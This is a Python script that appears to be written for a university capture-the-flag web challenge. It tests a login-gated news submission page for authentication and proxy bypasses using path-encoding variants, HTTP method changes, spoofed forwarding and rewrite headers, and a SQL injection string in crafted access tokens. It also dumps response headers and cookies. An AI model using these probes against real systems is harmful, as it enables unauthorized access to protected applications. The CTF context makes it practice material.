import requests
import re

BASE = "http://blockcitytimes.web.ctf.umasscybersec.org:5000"
s = requests.Session()

print("=" * 60)
print("TESTING PROXY BYPASS TECHNIQUES")
print("=" * 60)

# Test 1: Try various paths that might not be proxied
paths = [
    "/submit",
    "/api/config",
    "/api/tags",
    "/actuator/health",
    "/actuator/env",
    "/actuator/info",
    "/files/",
    "/login",
    "/",
    "/admin",
    "//submit",
    "/./submit",
    "/%2fsubmit",
    "/submit%00",
    "/submit;",
    "/submit/",
    "/SUBMIT",
]

print("\n[1] Testing path access...")
for path in paths:
    try:
        r = s.get(f"{BASE}{path}", timeout=10, allow_redirects=False)
        title = "Authenticate" if "Authenticate" in r.text else "OTHER"
        has_submit = "submit" in r.text.lower() and "story" in r.text.lower()
        print(f"  {path:30s} -> {r.status_code} | Title={title} | HasSubmitForm={has_submit} | Len={len(r.text)}")
        if title != "Authenticate":
            print(f"    *** DIFFERENT RESPONSE! ***")
            print(f"    {r.text[:300]}")
    except Exception as e:
        print(f"  {path:30s} -> ERROR: {e}")

# Test 2: Try different HTTP methods
print("\n[2] Testing HTTP methods on /submit...")
for method in ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"]:
    try:
        r = s.request(method, f"{BASE}/submit", timeout=10, allow_redirects=False)
        title = "Authenticate" if "Authenticate" in r.text else "OTHER"
        print(f"  {method:10s} -> {r.status_code} | Title={title} | Len={len(r.text)}")
        if title != "Authenticate" and r.status_code != 405:
            print(f"    *** DIFFERENT RESPONSE! ***")
            print(f"    {r.text[:300]}")
    except Exception as e:
        print(f"  {method:10s} -> ERROR: {e}")

# Test 3: Try header manipulation
print("\n[3] Testing header manipulation...")
headers_list = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Forwarded-Host": "app.internal:8080"},
    {"Host": "app.internal:8080"},
    {"X-Original-URL": "/submit"},
    {"X-Rewrite-URL": "/submit"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1", "X-Forwarded-Host": "localhost"},
    {"X-Forwarded-Proto": "https"},
]
for hdrs in headers_list:
    try:
        r = s.get(f"{BASE}/submit", headers=hdrs, timeout=10, allow_redirects=False)
        title = "Authenticate" if "Authenticate" in r.text else "OTHER"
        print(f"  {str(hdrs):60s} -> {r.status_code} | {title}")
        if title != "Authenticate":
            print(f"    *** BYPASS FOUND! ***")
            print(f"    {r.text[:500]}")
    except Exception as e:
        print(f"  {str(hdrs):60s} -> ERROR: {e}")

# Test 4: Try malformed/crafted tokens
print("\n[4] Testing crafted tokens...")
# Get CSRF token first
r = s.get(f"{BASE}/", timeout=10)
csrf_match = re.search(r'name="csrf_token" value="([^"]+)"', r.text)
csrf = csrf_match.group(1) if csrf_match else ""

tokens_to_try = [
    "ctfd_",
    "ctfd_1",
    "ctfd_admin",
    "ctfd_test",
    " ",
    "' OR '1'='1",
    "ctfd_a" * 20,
    "anything",
]
for token in tokens_to_try:
    try:
        # Re-get CSRF for each attempt (Flask rotates)
        r = s.get(f"{BASE}/", timeout=10) 
        csrf_match = re.search(r'name="csrf_token" value="([^"]+)"', r.text)
        csrf = csrf_match.group(1) if csrf_match else ""
        
        r = s.post(f"{BASE}/", data={
            "csrf_token": csrf,
            "ctfd_team_access_token": token
        }, timeout=10, allow_redirects=True)
        title = "Authenticate" if "Authenticate" in r.text else "OTHER"
        error_msg = ""
        err_match = re.search(r'\[!\]\s*(.*?)(?:<|$)', r.text)
        if err_match:
            error_msg = err_match.group(1).strip()
        print(f"  Token={token[:30]:30s} -> {r.status_code} | {title} | Error: {error_msg}")
        if title != "Authenticate":
            print(f"    *** BYPASS FOUND! ***")
            print(f"    {r.text[:500]}")
    except Exception as e:
        print(f"  Token={token[:30]:30s} -> ERROR: {e}")

# Test 5: Check response headers for clues
print("\n[5] Response headers from / ...")
r = s.get(f"{BASE}/", timeout=10)
for k, v in r.headers.items():
    print(f"  {k}: {v}")

# Test 6: Check cookies
print("\n[6] Current cookies...")
for c in s.cookies:
    print(f"  {c.name}: {c.value}")

print("\n" + "=" * 60)
print("DONE")
